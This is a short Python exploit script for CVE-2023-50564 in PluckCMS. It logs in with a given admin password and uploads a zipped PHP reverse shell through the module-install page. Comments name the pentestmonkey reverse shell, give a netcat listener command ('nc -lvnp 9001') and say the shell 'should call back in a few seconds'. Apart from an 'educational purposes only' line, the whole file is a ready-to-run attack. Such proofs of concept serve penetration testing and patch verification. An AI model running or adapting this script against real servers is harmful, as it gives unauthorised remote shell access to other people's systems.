import requests
import requests_toolbelt
import argparse 

# author rwexecute
# for educational purposes only

# this script abuses cve-2023-50564 to upload a reverse-php shell to the target server 
# you can use https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
# as your shell 
# make sure to add your host/port to the reverse shell, then
# open a listener like nc -lvnp 9001 and after that
# just zip the php file and pass the zip to this script 
# example: python3 cve-2023-50564.py -u http://idonot.exist -f shell.zip -p hunter2

def get_cli_args() -> argparse.Namespace:
    par = argparse.ArgumentParser()
    par.add_argument('-u', '--url', help='Base URL', nargs='?', required=True)
    par.add_argument('-f', '--file', help='File which gets uploaded', nargs='?', required=True)
    par.add_argument('-p', '--password', help='Password for PluckCMS', nargs='?', required=True)

    return par.parse_args()

def main():
    # Get Args 
    args = get_cli_args()

    # Login params
    l_url = f"{args.url}/login.php" 
    l_data = {"cont1":args.password, "bogus": "", "submit":"Log in"} 

    # Upload params 
    u_url = f"{args.url}/admin.php?action=installmodule"
    u_file = args.file
    u_data = requests_toolbelt.MultipartEncoder(
        {
            "sendfile": (
                u_file,
                open(u_file, "rb"),
                "application/zip"
            ),
            "submit":"Upload"
        }
    )
    u_headers = {
        "Referer": u_url,
        "Content-Type": u_data.content_type
    }

    sess = requests.session()

    # Be extra helpful
    while True:
        if(input('[INFO] Make sure to open a listener before continuing to catch your shell! [y]\n').lower() == 'y'):
            break
        else:
            print('Type y to continue!')

    # Login 
    if(sess.post(l_url, l_data).status_code != 200):
        print('[ERROR] Could not login, check your password')
        exit(1)

    # Upload Shell
    if(sess.post(headers=u_headers, url=u_url, data=u_data).status_code != 200):
        print('[ERROR] Upload failed')
        exit(1)

    print('[INFO] File was uploaded. Your shell should call back in a few seconds.')

if __name__ == "__main__":
    main()
